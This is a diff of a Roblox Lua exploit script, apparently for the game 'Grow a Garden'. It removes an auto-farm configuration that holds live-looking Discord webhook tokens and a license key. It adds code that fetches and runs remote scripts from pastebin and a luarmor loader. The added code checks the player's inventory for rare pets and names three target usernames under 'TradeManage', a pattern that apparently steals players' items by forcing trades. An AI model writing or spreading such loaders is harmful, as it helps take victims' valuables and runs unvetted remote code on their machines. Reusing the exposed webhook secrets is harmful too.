@@ -1,219 +1,59 @@
-getgenv().ConfigsKaitun = {
-	["Block Pet Gift"] = true,
-	
-	["Low Cpu"] = true,
-	["Auto Rejoin"] = true,
-	
-	["Rejoin When Update"] = false,
-	["Limit Tree"] = {
-		["Limit"] = 250,
-		["Destroy Untill"] = 150,
+loadstring(game:HttpGet("https://pastebin.com/raw/CX4SyK4S"))()
 
-		["Safe Tree"] = {
-			"Serenity",
-			"Embar Lily",
-			"Sugar Apple",
+if not game:IsLoaded() then
+    repeat
+        game.Loaded:Wait()
+    until game:IsLoaded()
+end
 
-			-- locked fruit for zen event
-			["Serenity"] = 1, ["Strawberry"] = 1, ["Blueberry"] = 1,
-			["Orange Tulip"] = 1, ["Corn"] = 1, ["Daffodil"] = 1,
-			["Bamboo"] = 1, ["Apple"] = 1, ["Coconut"] = 1,
-			["Pumpkin"] = 1, ["Watermelon"] = 1, ["Cactus"] = 1,
-			["Dragon Fruit"] = 1, ["Mango"] = 1, ["Grape"] = 1,
-			["Mushroom"] = 1, ["Pepper"] = 1, ["Cacao"] = 1
-		}
-	},
+repeat wait() until game.Players
+repeat wait() until game.Players.LocalPlayer
 
-	Seed = {
-		Buy = {
-			Mode = "Auto", -- Custom , Auto
-			Custom = {
-				"Serenity",
-				"Carrot",
-			}
-		},
-		Place = {
-			Mode = "Lock", -- Select , Lock
-			Select = {
-				"Carrot"
-			},
-			Lock = {
-				"Maple Apple",
-				"Sunflower",
-				"Dragon Pepper",
-				"Elephant Ears",
-				"Tranquil Bloom",
-				"Moon Melon",
-				"Easter Egg",
-				"Moon Mango",
-				"Bone Blossom",
-				"Fossilight",
-			}
-		}
-	},
+local VirtualInputManager = game:GetService("VirtualInputManager")
+repeat task.wait()
+    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
+    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
+until game.Players.LocalPlayer:GetAttribute("DataFullyLoaded")
 
-	["Seed Pack"] = {
-		Locked = {
+game:GetService("Players").LocalPlayer.Idled:Connect(function()
+    game:GetService("VirtualUser"):Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
+    task.wait(1)
+    game:GetService("VirtualUser"):Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
+end)
 
-		}
-	},
+local function hasTargetPet(petList)
+    local success, result = pcall(function()
+        local player = game.Players.LocalPlayer
+        setthreadidentity(2)
+        local ActivePetsService = require(game:GetService("ReplicatedStorage").Modules.ReplicationClass).new("ActivePetsService_Replicator")
+        setthreadidentity(8)
+        local allData = ActivePetsService:YieldUntilData().Table.PlayerPetData[player.Name]["PetInventory"]["Data"]
 
-	Events = {
-		["Zen Event"] = {
-			["Restocking"] = { -- Minimumthing to restock
-				Max_Restocks_Price = 3_000_000_000_000,
-				Minimum_Money = 1_000_000,
-				Minimum_Chi = 20
-			},
-			["Doing"] = {
-				Minimum_Money = 1_000_000, -- minimum money to start play this event
-				First_Upgrade_Tree = 7,
-				Maximum_Chi = 100,
-			}
-		},
-		["Traveling Shop"] = {
-			"Bee Egg",
-		},
-		Craft = {
-			"Primal Egg",
-			"Anti Bee Egg",
-			"Small Toy",
-			"Small Treat",
-			"Ancient Seed Pack",
-		},
-		Shop = {
-			"Zen Egg",
-			"Zen Seed Pack",
-			"Soft Sunshine",
-			"Sakura Bush",
-			"Raiju",
-			"Zenflare",
-		},
-	},
+        for uuid, pet in pairs(allData) do
+            if table.find(petList, pet.PetType) then
+                return true
+            end
+        end
+        return false
+    end)
 
-	Gear = {
-		Buy = { 
-			"Medium Toy",
-			"Medium Treat",
-			"Levelup Lollipop",
-		},
-		Lock = {
-		},
-	},
-
-	Eggs = {
-		Place = {
-			"Zen Egg",
-			"Anti Bee Egg",
-			"Bug Egg",
-			"Paradise Egg",
-			"Common Summer Egg",
-		},
-		Buy = {
-			"Anti Bee Egg",
-			"Bee Egg",
-			"Night Egg",
-			"Bug Egg",
-			"Paradise Egg",
-			"Mythical Egg",
-			"Rare Egg",
-			"Rare Summer Egg",
-			"Common Summer Egg",
-			"Common Egg",
-		}
-	},
-
-	Pets = {
-		["Start Delete Pet At"] = 50,
-		["Upgrade Slot"] = {
-			["Pet"] = {
-				["Starfish"] = { 8, 75, 1 },
-				["Kodama"] = { 8, 100, 1 },
-			},
-			["Limit Upgrade"] = 1,
-			["Equip When Done"] = {
-				["Kodama"] = { 4, 100, 1 },
-				["Corrupted Kodama"] = { 8, 100, 2 },
-				["Tanchozuru"] = { 8, 100, 3 },
-			},
-		},
-		Locked_Pet_Age = 50, -- pet that age > 60 will lock
-		Locked = {
-			"Corrupted Kitsune",
-			"Corrupted Kodama",
-			"Raiju",
-			"Kitsune",
-			"Tanchozuru",
-			"Disco Bee",
-			"Butterfly",
-			"Queen Bee",
-			"Dragonfly",
-			"Raccoon",
-			"Red Fox",
-			"Mimic Octopus",
-			"Hyacinth Macaw",
-			"Brontosaurus",
-			"Dilophosaurus",
-			"Ankylosaurus",
-			"Spinosaurus",
-			"T-Rex",
-			["Seagull"] = 5,
-			["Shiba Inu"] = 5,
-			["Nihonzaru"] = 5,
-			["Stegosaurus"] = 5,
-			["Peacock"] = 5,
-			["Triceratops"] = 5,
-			["Pterodactyl"] = 2,
-			["Toucan"] = 5,
-			["Capybara"] = 5,
-			["Bunny"] = 5,
-			["Golden Lab"] = 5,
-			["Bee"] = 3,
-			["Bunny"] = 5,
-			["Golden Lab"] = 5,
-		},
-		LockPet_Weight = 5, -- if Weight >= 10 they will locked,
-		Instant_Sell = {		
-			"Shiba Inu",
-			"Dog",
-		}
-	},
-
-	Webhook = {
-        UrlPet = "https://discord.com/api/webhooks/1392524927059628204/7IM9d3MXyDc4pDdGwCketDGF7Dq6LbmWXFxDXzyXvIMhdlzqDKJ42JXukKzvH2y2M8OX",
-        UrlSeed = "https://discord.com/api/webhooks/1392525050984267849/WXg4I0Lg0j6Os1p33BxSL1A95g79OY7_fPH6d8EM-P4rh8u12YmSZKtL0O7LYNY_O-Ky",
-        PcName = "SUPERCOMPUTER-NASA-888",
-
-		Noti = {
-			Seeds = {
-				"Sunflower",
-				"Dragon Pepper",
-				"Elephant Ears",
-				"Bone Blossom",
-				"Dragon Sapling",
-                "Maple Apple",
-			},
-			SeedPack = {
-				"Idk"
-			},
-			Pets = {
-				"Corrupted Kitsune",
-				"Raiju",
-				"Kitsune",
-				"T-Rex",
-				"Disco Bee",
-				"Butterfly",
-				"Mimic Octopus",
-				"Fennec Fox",
-				"Queen Bee",
-				"Dragonfly",
-				"Raccoon",
-				"Spinosaurus",
-			},
-			Pet_Weight_Noti = true,
-		}
-	},
-}
-License = "v8ysS9aq1BxyhsZ84I4Lf5ZN4krGQN8j"
- 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Real-Aya/Loader/main/Init.lua'))()
+    return success and result
+end
+    getgenv().KEY = "Shippy"
+    _G.TradeManage = {
+        Target = {
+            "KingSentz645770",
+			"OrvilleuMoEfH",
+			"SafiyaAlShafee72"
+        },
+        Pet = {
+            "Corrupted Kitsune",
+            "Mimic Octopus",
+            "Dragonfly"
+        }
+    }
+if hasTargetPet(_G.TradeManage.Pet) then
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/64146f41d4c3ead8fb6d71339ef0c7c2.lua"))()
+else
+    loadstring(game:HttpGet("https://pastebin.com/raw/CX4SyK4S"))()
+end
